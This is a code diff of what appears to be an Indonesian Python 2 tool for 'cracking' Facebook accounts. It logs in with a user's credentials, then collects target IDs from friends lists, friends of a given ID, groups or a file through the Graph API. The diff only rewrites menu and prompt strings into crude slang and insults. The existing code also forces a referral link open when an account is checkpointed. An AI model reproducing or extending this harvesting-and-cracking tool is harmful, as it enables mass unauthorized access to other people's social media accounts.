@@ -115,7 +115,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA :)  \x1b[1;96m[☆]' )
+		print('\033[1;96m[©] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA  \x1b[1;96m[®]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -152,7 +152,7 @@ def login():
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mGoblok Akun Nya Checkpoint Cok ")
+			print("\n\033[1;96m[!] \x1b[1;91mMampus Akun Nya Checkpoint Cok ")
 			os.system('xdg-open https://duit.cc/join/ref/97411')
 			time.sleep(1)
 			keluar()
@@ -204,7 +204,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
-		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
+		print "\033[1;96m[!] \x1b[1;91mIsi Seng Bener Kon Tak Tapok"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -237,11 +237,11 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[32;1m1.\x1b[0;1m Crack dari daftar teman"
-	print "\x1b[32;1m2.\x1b[0;1m Crack dari teman dari teman"
-	print "\x1b[32;1m3.\x1b[0;1m Crack dari member grup"
-	print "\x1b[32;1m4.\x1b[0;1m Crack dari file"
-	print "\n\x1b[32;1m0.\x1b[33;1m Kembali"
+	print "\x1b[32;1m1.\x1b[0;1m Crack dari daftar teman √"
+	print "\x1b[32;1m2.\x1b[0;1m Crack dari ID teman √"
+	print "\x1b[32;1m3.\x1b[0;1m Crack dari ID grup ×"
+	print "\x1b[32;1m4.\x1b[0;1m Crack dari file √"
+	print "\n\x1b[32;1m0.\x1b[33;1m BAlIK"
 	pilih_super()
 
 def pilih_super():
@@ -262,7 +262,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[32;1mMasukan ID teman \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;96m[+] \033[32;1mMasukan ID teman Mu Tod \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -271,7 +271,7 @@ def pilih_super():
 			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✓] \033[32;1mMengambil ID Tod \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -315,7 +315,7 @@ def pilih_super():
 	print "\033[1;96m[+] \033[32;1mTotal ID \033[1;91m: \033[0;1m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mSek Crack Tod \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[0;1mSabar Cok. Kalo Cp Tungguin Ae Cok 2 Hari')
 	print 42*"\033[1;96m="
